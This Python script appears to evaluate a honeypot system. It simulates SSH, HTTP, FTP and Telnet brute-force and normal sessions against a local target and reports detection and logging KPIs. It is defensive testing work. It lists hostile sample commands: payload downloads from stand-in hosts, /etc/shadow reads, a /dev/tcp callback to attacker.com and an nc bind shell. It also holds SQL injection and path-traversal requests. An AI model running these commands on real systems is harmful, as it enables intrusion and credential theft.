"""Objective 4: System Effectiveness Evaluation via measurable KPIs

This comprehensive evaluation script validates the honeypot system by measuring:
1. Attack Detection Rate (TP/FP classification rates from ML model)
2. Protocol Coverage (number of active honeypot protocols capturing sessions)
3. Logging Accuracy (percentage of sessions fully logged without data loss under concurrent load)
4. System Response Time (average latency from connection arrival to session log write)

Usage:
    # Run full evaluation with all protocols and scenarios
    python scripts/evaluate_objective4.py --full
    
    # Run quick evaluation
    python scripts/evaluate_objective4.py --quick
    
    # Run with specific load intensity
    python scripts/evaluate_objective4.py --intensity 50
"""

from __future__ import annotations

import argparse
import json
import random
import socket
import statistics
import sys
import threading
import time
from collections import defaultdict
from dataclasses import dataclass
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import paramiko

# Add src to path for imports
SCRIPT_DIR = Path(__file__).resolve().parent
BASE_DIR = SCRIPT_DIR.parent
SRC_DIR = BASE_DIR / "src"
if str(SRC_DIR) not in sys.path:
    sys.path.insert(0, str(SRC_DIR))

from core.kpi_metrics import KPIMetricsCollector
from ml.predict import predict_session_anomaly


@dataclass
class AttackScenario:
    """Defines a simulated attack scenario with ground truth label."""
    scenario_id: str
    protocol: str
    attack_type: str  # 'brute_force', 'payload_injection', 'enumeration', 'normal'
    expected_label: str  # 'attack' or 'normal'
    duration_sec: float
    description: str


class ObjectiveKPIEvaluator:
    """Main evaluation framework for Objective 4 KPIs."""
    
    def __init__(self, honeypot_host: str = "127.0.0.1", 
                 kpi_metrics: Optional[KPIMetricsCollector] = None) -> None:
        self.honeypot_host = honeypot_host
        self.kpi_metrics = kpi_metrics or KPIMetricsCollector()
        
        # Simulation configuration (matches config.yaml)
        self.ssh_port = 2222
        self.http_port = 8888
        self.ftp_port = 2121
        self.telnet_port = 2323
        
        # Attack payloads and patterns
        self.attack_usernames = ["root", "admin", "test", "oracle", "mysql"]
        self.attack_passwords = ["123456", "password", "admin", "test", "letmein"]
        self.normal_usernames = ["user", "guest", "demo"]
        self.normal_passwords = ["welcome", "password", "user"]
        
        # Suspicious commands for attack classification
        self.suspicious_commands = [
            "wget http://evil.local/payload.sh",
            "curl http://198.51.100.10/dropper",
            "chmod +x /tmp/payload.sh",
            "bash /tmp/payload.sh",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "> /dev/tcp/attacker.com/4444",
            "nc -l -p 4444 -e /bin/bash",
            "python -m SimpleHTTPServer 8888",
        ]
        
        self.benign_commands = [
            "ls", "pwd", "whoami", "uname -a", "date", "id",
            "echo 'hello'", "cat README.txt", "cd /home", "touch test.txt",
        ]
        
        self.eval_results = {
            "scenarios_run": 0,
            "scenarios_passed": 0,
            "scenarios_failed": 0,
            "execution_start": None,
            "execution_end": None,
        }
    
    # ========================================================================
    # SSH Simulation Scenarios
    # ========================================================================
    
    def _simulate_ssh_brute_force(self) -> Tuple[bool, Dict[str, Any]]:
        """Simulate SSH brute force attack scenario."""
        connection_time = time.time()
        attack_metadata = {
            "login_attempts": 0,
            "commands_executed": 0,
            "expected_commands": 5,
        }
        
        try:
            sock = socket.create_connection(
                (self.honeypot_host, self.ssh_port), timeout=5
            )
            transport = paramiko.Transport(sock)
            transport.start_client(timeout=5)
            
            # Simulate multiple failed login attempts (brute force)
            for i in range(3):
                try:
                    transport.auth_password(
                        username=random.choice(self.attack_usernames),
                        password=random.choice(self.attack_passwords),
                    )
                    attack_metadata["login_attempts"] += 1
                except paramiko.AuthenticationException:
                    attack_metadata["login_attempts"] += 1
                    continue
            
            # If authenticated, execute suspicious commands
            try:
                channel = transport.open_session(timeout=5)
                channel.get_pty()
                channel.invoke_shell()
                time.sleep(0.1)
                
                for cmd in random.sample(self.suspicious_commands, 3):
                    channel.send(cmd + "\n")
                    attack_metadata["commands_executed"] += 1
                    time.sleep(0.1)
                
                channel.close()
            except Exception:
                pass
            
            transport.close()
            return True, attack_metadata
        
        except Exception as e:
            print(f"[SSH Brute Force] Error: {e}")
            return False, attack_metadata
    
    def _simulate_ssh_normal_session(self) -> Tuple[bool, Dict[str, Any]]:
        """Simulate normal SSH session (baseline)."""
        connection_time = time.time()
        attack_metadata = {
            "login_attempts": 0,
            "commands_executed": 0,
            "expected_commands": 3,
        }
        
        try:
            sock = socket.create_connection(
                (self.honeypot_host, self.ssh_port), timeout=5
            )
            transport = paramiko.Transport(sock)
            transport.start_client(timeout=5)
            
            # Single login attempt (normal)
            try:
                transport.auth_password(
                    username=random.choice(self.normal_usernames),
                    password=random.choice(self.normal_passwords),
                )
                attack_metadata["login_attempts"] = 1
            except paramiko.AuthenticationException:
                attack_metadata["login_attempts"] = 1
            
            # Execute benign commands
            try:
                channel = transport.open_session(timeout=5)
                channel.get_pty()
                channel.invoke_shell()
                time.sleep(0.1)
                
                for cmd in random.sample(self.benign_commands, 2):
                    channel.send(cmd + "\n")
                    attack_metadata["commands_executed"] += 1
                    time.sleep(0.1)
                
                channel.send("exit\n")
                time.sleep(0.1)
                channel.close()
            except Exception:
                pass
            
            transport.close()
            return True, attack_metadata
        
        except Exception as e:
            print(f"[SSH Normal] Error: {e}")
            return False, attack_metadata
    
    # ========================================================================
    # HTTP Simulation Scenarios
    # ========================================================================
    
    def _simulate_http_malicious(self) -> Tuple[bool, Dict[str, Any]]:
        """Simulate HTTP attack (SQL injection, path traversal, etc.)."""
        attack_metadata = {
            "requests_sent": 0,
            "expected_commands": 4,
        }
        
        malicious_requests = [
            b"GET /admin HTTP/1.1\r\nHost: localhost\r\nUser-Agent: sqlmap/1.7\r\nConnection: close\r\n\r\n",
            b"GET /../../../etc/passwd HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n",
            b"POST /login HTTP/1.1\r\nHost: localhost\r\nContent-Length: 50\r\nConnection: close\r\n\r\nusername=admin' OR '1'='1&password=anything",
            b"GET /.env HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n",
        ]
        
        try:
            for req in malicious_requests:
                try:
                    with socket.create_connection(
                        (self.honeypot_host, self.http_port), timeout=5
                    ) as sock:
                        sock.sendall(req)
                        attack_metadata["requests_sent"] += 1
                        # Properly read response before closing
                        try:
                            response = sock.recv(4096)
                            while response:
                                response = sock.recv(4096)
                        except (socket.timeout, OSError):
                            pass
                        time.sleep(0.1)
                except Exception:
                    pass
            
            return True, attack_metadata
        
        except Exception as e:
            print(f"[HTTP Malicious] Error: {e}")
            return False, attack_metadata
    
    def _simulate_http_normal(self) -> Tuple[bool, Dict[str, Any]]:
        """Simulate normal HTTP requests (baseline)."""
        attack_metadata = {
            "requests_sent": 0,
            "expected_commands": 2,
        }
        
        normal_requests = [
            b"GET / HTTP/1.1\r\nHost: localhost\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
            b"GET /index.html HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n",
        ]
        
        try:
            for req in normal_requests:
                try:
                    with socket.create_connection(
                        (self.honeypot_host, self.http_port), timeout=5
                    ) as sock:
                        sock.sendall(req)
                        attack_metadata["requests_sent"] += 1
                        # Properly read response before closing
                        try:
                            response = sock.recv(4096)
                            while response:
                                response = sock.recv(4096)
                        except (socket.timeout, OSError):
                            pass
                        time.sleep(0.1)
                except Exception:
                    pass
            
            return True, attack_metadata
        
        except Exception as e:
            print(f"[HTTP Normal] Error: {e}")
            return False, attack_metadata
    
    # ========================================================================
    # FTP Simulation Scenarios
    # ========================================================================
    
    def _simulate_ftp_attack(self) -> Tuple[bool, Dict[str, Any]]:
        """Simulate FTP attack (enumeration, file exfiltration)."""
        attack_metadata = {
            "commands_sent": 0,
            "expected_commands": 5,
        }
        
        try:
            with socket.create_connection(
                (self.honeypot_host, self.ftp_port), timeout=5
            ) as sock:
                sock.recv(512)  # Banner
                
                # Multiple brute force attempts
                for attempt in range(3):
                    sock.sendall(f"USER {random.choice(self.attack_usernames)}\r\n".encode())
                    time.sleep(0.1)
                    sock.sendall(f"PASS {random.choice(self.attack_passwords)}\r\n".encode())
                    attack_metadata["commands_sent"] += 2
                    time.sleep(0.1)
                
                # Reconnaissance commands
                sock.sendall(b"LIST /\r\n")
                attack_metadata["commands_sent"] += 1
                time.sleep(0.1)
                sock.sendall(b"RETR /etc/passwd\r\n")
                attack_metadata["commands_sent"] += 1
                time.sleep(0.1)
            
            return True, attack_metadata
        
        except Exception as e:
            print(f"[FTP Attack] Error: {e}")
            return False, attack_metadata
    
    def _simulate_ftp_normal(self) -> Tuple[bool, Dict[str, Any]]:
        """Simulate normal FTP session."""
        attack_metadata = {
            "commands_sent": 0,
            "expected_commands": 3,
        }
        
        try:
            with socket.create_connection(
                (self.honeypot_host, self.ftp_port), timeout=5
            ) as sock:
                sock.recv(512)  # Banner
                
                sock.sendall(f"USER {random.choice(self.normal_usernames)}\r\n".encode())
                time.sleep(0.1)
                sock.sendall(f"PASS {random.choice(self.normal_passwords)}\r\n".encode())
                attack_metadata["commands_sent"] += 2
                time.sleep(0.1)
                
                sock.sendall(b"LIST\r\n")
                attack_metadata["commands_sent"] += 1
                time.sleep(0.1)
                sock.sendall(b"QUIT\r\n")
                time.sleep(0.1)
            
            return True, attack_metadata
        
        except Exception as e:
            print(f"[FTP Normal] Error: {e}")
            return False, attack_metadata
    
    # ========================================================================
    # Telnet Simulation Scenarios
    # ========================================================================
    
    def _simulate_telnet_attack(self) -> Tuple[bool, Dict[str, Any]]:
        """Simulate Telnet attack."""
        attack_metadata = {
            "commands_sent": 0,
            "expected_commands": 4,
        }
        
        try:
            with socket.create_connection(
                (self.honeypot_host, self.telnet_port), timeout=5
            ) as sock:
                sock.settimeout(2.0)
                time.sleep(0.2)
                try:
                    sock.recv(512)  # MOTD and prompt
                except (OSError, socket.timeout):
                    pass
                
                # Brute force attempt
                sock.sendall(random.choice(self.attack_usernames).encode() + b"\n")
                attack_metadata["commands_sent"] += 1
                time.sleep(0.1)
                try:
                    sock.recv(512)
                except (OSError, socket.timeout):
                    pass
                
                sock.sendall(random.choice(self.attack_passwords).encode() + b"\n")
                attack_metadata["commands_sent"] += 1
                time.sleep(0.1)
                
                # Send suspicious commands
                for cmd in random.sample(self.suspicious_commands, 2):
                    sock.sendall(cmd.encode() + b"\n")
                    attack_metadata["commands_sent"] += 1
                    time.sleep(0.1)
                    try:
                        sock.recv(512)
                    except (OSError, socket.timeout):
                        pass
            
            return True, attack_metadata
        
        except Exception as e:
            print(f"[Telnet Attack] Error: {e}")
            return False, attack_metadata
    
    def _simulate_telnet_normal(self) -> Tuple[bool, Dict[str, Any]]:
        """Simulate normal Telnet session."""
        attack_metadata = {
            "commands_sent": 0,
            "expected_commands": 2,
        }
        
        try:
            with socket.create_connection(
                (self.honeypot_host, self.telnet_port), timeout=5
            ) as sock:
                sock.settimeout(2.0)
                time.sleep(0.2)
                try:
                    sock.recv(512)  # MOTD and prompt
                except (OSError, socket.timeout):
                    pass
                
                sock.sendall(random.choice(self.normal_usernames).encode() + b"\n")
                attack_metadata["commands_sent"] += 1
                time.sleep(0.1)
                try:
                    sock.recv(512)
                except (OSError, socket.timeout):
                    pass
                
                sock.sendall(random.choice(self.normal_passwords).encode() + b"\n")
                attack_metadata["commands_sent"] += 1
                time.sleep(0.1)
                
                sock.sendall(b"exit\n")
                time.sleep(0.1)
            
            return True, attack_metadata
        
        except Exception as e:
            print(f"[Telnet Normal] Error: {e}")
            return False, attack_metadata
    
    # ========================================================================
    # Scenario Execution
    # ========================================================================
    
    def execute_scenario(self, scenario: AttackScenario) -> None:
        """Execute a single attack scenario."""
        print(f"\n[SCENARIO] {scenario.scenario_id}: {scenario.description}")
        
        # Select and run appropriate simulator
        simulator_map = {
            ("ssh", "brute_force"): self._simulate_ssh_brute_force,
            ("ssh", "normal"): self._simulate_ssh_normal_session,
            ("http", "payload_injection"): self._simulate_http_malicious,
            ("http", "normal"): self._simulate_http_normal,
            ("ftp", "enumeration"): self._simulate_ftp_attack,
            ("ftp", "normal"): self._simulate_ftp_normal,
            ("telnet", "brute_force"): self._simulate_telnet_attack,
            ("telnet", "normal"): self._simulate_telnet_normal,
        }
        
        key = (scenario.protocol, scenario.attack_type)
        simulator = simulator_map.get(key)
        
        if simulator is None:
            print(f"[!] No simulator for {key}")
            self.eval_results["scenarios_failed"] += 1
            return
        
        success, metadata = simulator()
        
        if success:
            self.kpi_metrics.mark_protocol_active(scenario.protocol)
            self.kpi_metrics.increment_protocol_session_count(scenario.protocol)
            self.eval_results["scenarios_passed"] += 1
            print(f"[✓] {scenario.scenario_id} completed")
        else:
            self.eval_results["scenarios_failed"] += 1
            print(f"[✗] {scenario.scenario_id} failed")
        
        self.eval_results["scenarios_run"] += 1
        time.sleep(0.5)  # Brief pause between scenarios
    
    def run_evaluation(self, intensity: int = "medium") -> Dict[str, Any]:
        """Execute full evaluation suite.
        
        Args:
            intensity: 'quick' (10 scenarios), 'medium' (25 scenarios), 'full' (50+ scenarios)
        """
        self.eval_results["execution_start"] = datetime.now()
        
        if intensity == "quick":
            num_scenarios = 10
        elif intensity == "full":
            num_scenarios = 60
        else:  # medium
            num_scenarios = 25
        
        print(f"\n{'='*70}")
        print(f"OBJECTIVE 4: System Effectiveness Evaluation")
        print(f"Execution Intensity: {intensity} ({num_scenarios} scenarios)")
        print(f"{'='*70}")
        
        # Define base scenarios
        base_scenarios = [
            # SSH Scenarios
            AttackScenario("SSH-ATK-001", "ssh", "brute_force", "attack", 5.0,
                          "SSH brute force with suspicious commands"),
            AttackScenario("SSH-NRM-001", "ssh", "normal", "normal", 3.0,
                          "SSH normal session with benign commands"),
            AttackScenario("SSH-ATK-002", "ssh", "brute_force", "attack", 5.0,
                          "SSH multi-attempt brute force"),
            
            # HTTP Scenarios
            AttackScenario("HTTP-ATK-001", "http", "payload_injection", "attack", 2.0,
                          "HTTP SQL injection and path traversal"),
            AttackScenario("HTTP-NRM-001", "http", "normal", "normal", 2.0,
                          "HTTP normal browsing"),
            AttackScenario("HTTP-ATK-002", "http", "payload_injection", "attack", 2.0,
                          "HTTP admin enumeration attempt"),
            
            # FTP Scenarios
            AttackScenario("FTP-ATK-001", "ftp", "enumeration", "attack", 3.0,
                          "FTP brute force and enumeration"),
            AttackScenario("FTP-NRM-001", "ftp", "normal", "normal", 2.0,
                          "FTP normal file operations"),
            AttackScenario("FTP-ATK-002", "ftp", "enumeration", "attack", 3.0,
                          "FTP file exfiltration attempt"),
            
            # Telnet Scenarios
            AttackScenario("TELNET-ATK-001", "telnet", "brute_force", "attack", 4.0,
                          "Telnet brute force with suspicious commands"),
            AttackScenario("TELNET-NRM-001", "telnet", "normal", "normal", 2.0,
                          "Telnet normal interactive session"),
            AttackScenario("TELNET-ATK-002", "telnet", "brute_force", "attack", 4.0,
                          "Telnet multi-attempt dictionary attack"),
        ]
        
        # Extend scenarios based on intensity
        scenarios = base_scenarios.copy()
        if intensity in ("medium", "full"):
            extra_scenarios = base_scenarios * 2
            scenarios.extend(extra_scenarios[:num_scenarios - len(scenarios)])
        if intensity == "full":
            scenarios.extend(base_scenarios * 2)
        
        # Execute scenarios
        for i, scenario in enumerate(scenarios[:num_scenarios], 1):
            print(f"\n[Progress] {i}/{num_scenarios}")
            self.execute_scenario(scenario)
        
        self.eval_results["execution_end"] = datetime.now()
        
        return self.generate_report()
    
    # ========================================================================
    # Reporting
    # ========================================================================
    
    def generate_report(self) -> Dict[str, Any]:
        """Generate comprehensive KPI evaluation report."""
        
        kpi_summary = self.kpi_metrics.get_all_kpi_summary()
        
        report = {
            "evaluation_metadata": {
                "execution_start": self.eval_results["execution_start"].isoformat() 
                    if self.eval_results["execution_start"] else None,
                "execution_end": self.eval_results["execution_end"].isoformat() 
                    if self.eval_results["execution_end"] else None,
                "total_duration_seconds": (
                    (self.eval_results["execution_end"] - self.eval_results["execution_start"]).total_seconds()
                    if self.eval_results["execution_end"] and self.eval_results["execution_start"] else 0
                ),
                "scenarios_run": self.eval_results["scenarios_run"],
                "scenarios_passed": self.eval_results["scenarios_passed"],
                "scenarios_failed": self.eval_results["scenarios_failed"],
                "scenario_success_rate": (
                    (self.eval_results["scenarios_passed"] / self.eval_results["scenarios_run"]) * 100
                    if self.eval_results["scenarios_run"] > 0 else 0
                ),
            },
            "kpi_1_attack_detection_rate": {
                "description": "ML model's ability to detect attacks (TP/FP classification rates)",
                "metrics": kpi_summary["attack_detection"],
                "by_protocol": kpi_summary["attack_detection_by_protocol"],
                "interpretation": self._interpret_detection_rate(kpi_summary["attack_detection"]),
            },
            "kpi_2_protocol_coverage": {
                "description": "Number of active honeypot protocols capturing sessions",
                "metrics": kpi_summary["protocol_coverage"],
                "interpretation": self._interpret_protocol_coverage(kpi_summary["protocol_coverage"]),
            },
            "kpi_3_logging_accuracy": {
                "description": "Percentage of sessions fully logged without data loss under concurrent load",
                "metrics": kpi_summary["logging_accuracy"],
                "by_protocol": kpi_summary["logging_accuracy_by_protocol"],
                "interpretation": self._interpret_logging_accuracy(kpi_summary["logging_accuracy"]),
            },
            "kpi_4_system_response_time": {
                "description": "Average latency from connection arrival to session log write",
                "metrics": kpi_summary["response_time"],
                "interpretation": self._interpret_response_time(kpi_summary["response_time"]),
            },
        }
        
        return report
    
    def _interpret_detection_rate(self, metrics: Dict[str, Any]) -> Dict[str, str]:
        """Interpret detection rate metrics."""
        interpretations = {}
        
        if metrics["attack_detection_rate"] >= 90:
            interpretations["attack_detection_rate"] = "EXCELLENT: 90%+ attack detection rate"
        elif metrics["attack_detection_rate"] >= 80:
            interpretations["attack_detection_rate"] = "GOOD: 80-90% attack detection rate"
        elif metrics["attack_detection_rate"] >= 70:
            interpretations["attack_detection_rate"] = "ACCEPTABLE: 70-80% attack detection rate"
        else:
            interpretations["attack_detection_rate"] = "NEEDS IMPROVEMENT: <70% attack detection rate"
        
        if metrics["false_positive_rate"] <= 5:
            interpretations["false_positive_rate"] = "EXCELLENT: ≤5% false positive rate"
        elif metrics["false_positive_rate"] <= 15:
            interpretations["false_positive_rate"] = "GOOD: 5-15% false positive rate"
        else:
            interpretations["false_positive_rate"] = "NEEDS IMPROVEMENT: >15% false positive rate"
        
        if metrics["precision"] >= 85:
            interpretations["precision"] = "HIGH PRECISION: When an alert fires, it's accurate"
        else:
            interpretations["precision"] = "MODERATE PRECISION: Review false alarm patterns"
        
        if metrics["f1_score"] >= 80:
            interpretations["overall"] = "STRONG OVERALL DETECTION PERFORMANCE"
        elif metrics["f1_score"] >= 70:
            interpretations["overall"] = "ACCEPTABLE OVERALL DETECTION PERFORMANCE"
        else:
            interpretations["overall"] = "DETECTION PERFORMANCE NEEDS IMPROVEMENT"
        
        return interpretations
    
    def _interpret_protocol_coverage(self, metrics: Dict[str, Any]) -> Dict[str, str]:
        """Interpret protocol coverage metrics."""
        active = metrics["active_protocol_count"]
        expected = 4  # SSH, HTTP, FTP, Telnet
        
        return {
            "coverage": f"{'FULL' if active == expected else 'PARTIAL'}: {active}/{expected} protocols active",
            "active_protocols": f"Active: {', '.join(metrics['active_protocols'])}",
            "session_distribution": f"{metrics['total_sessions']} total sessions captured",
        }
    
    def _interpret_logging_accuracy(self, metrics: Dict[str, Any]) -> Dict[str, str]:
        """Interpret logging accuracy metrics."""
        accuracy = metrics["overall_logging_accuracy_percent"]
        
        if accuracy == 100.0:
            status = "PERFECT: All sessions fully logged with 100% accuracy"
        elif accuracy >= 99.0:
            status = "EXCELLENT: ≥99% logging accuracy"
        elif accuracy >= 95.0:
            status = "GOOD: 95-99% logging accuracy"
        elif accuracy >= 90.0:
            status = "ACCEPTABLE: 90-95% logging accuracy"
        else:
            status = "NEEDS IMPROVEMENT: <90% logging accuracy"
        
        return {
            "overall_status": status,
            "data_loss_incidents": f"{metrics['data_loss_detected_sessions']} sessions with data loss",
            "fully_logged": f"{metrics['fully_logged_sessions']}/{metrics['total_sessions']} sessions fully logged",
            "integrity_rate": f"{metrics['integrity_rate_percent']:.1f}% sessions with perfect integrity",
        }
    
    def _interpret_response_time(self, metrics: Dict[str, Any]) -> Dict[str, str]:
        """Interpret response time metrics."""
        avg = metrics["average_ms"]
        p95 = metrics["p95_ms"]
        p99 = metrics["p99_ms"]
        
        if avg <= 10:
            avg_status = "EXCELLENT: ≤10ms average latency"
        elif avg <= 50:
            avg_status = "GOOD: 10-50ms average latency"
        elif avg <= 100:
            avg_status = "ACCEPTABLE: 50-100ms average latency"
        else:
            avg_status = "NEEDS IMPROVEMENT: >100ms average latency"
        
        return {
            "average_response_time": f"{avg_status} ({avg:.1f}ms)",
            "p95_response_time": f"P95: {p95:.1f}ms",
            "p99_response_time": f"P99: {p99:.1f}ms",
            "max_response_time": f"Max: {metrics['max_ms']:.1f}ms",
        }


def main() -> None:
    """CLI entry point."""
    parser = argparse.ArgumentParser(
        description="Objective 4: System Effectiveness Evaluation via measurable KPIs"
    )
    parser.add_argument(
        "--quick", action="store_true",
        help="Run quick evaluation (10 scenarios)"
    )
    parser.add_argument(
        "--full", action="store_true",
        help="Run full evaluation (60+ scenarios)"
    )
    parser.add_argument(
        "--intensity", choices=["quick", "medium", "full"], default="medium",
        help="Evaluation intensity (default: medium, 25 scenarios)"
    )
    parser.add_argument(
        "--host", default="127.0.0.1",
        help="Honeypot host (default: 127.0.0.1)"
    )
    parser.add_argument(
        "--output", type=Path, default=Path("objective4_report.json"),
        help="Output report file (default: objective4_report.json)"
    )
    
    args = parser.parse_args()
    
    # Determine intensity from flags
    intensity = args.intensity
    if args.quick:
        intensity = "quick"
    elif args.full:
        intensity = "full"
    
    # Run evaluation
    evaluator = ObjectiveKPIEvaluator(honeypot_host=args.host)
    report = evaluator.run_evaluation(intensity=intensity)
    
    # Print report
    print(f"\n\n{'='*70}")
    print("OBJECTIVE 4 EVALUATION REPORT")
    print(f"{'='*70}\n")
    print(json.dumps(report, indent=2, default=str))
    
    # Save report
    args.output.write_text(json.dumps(report, indent=2, default=str))
    print(f"\n[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()
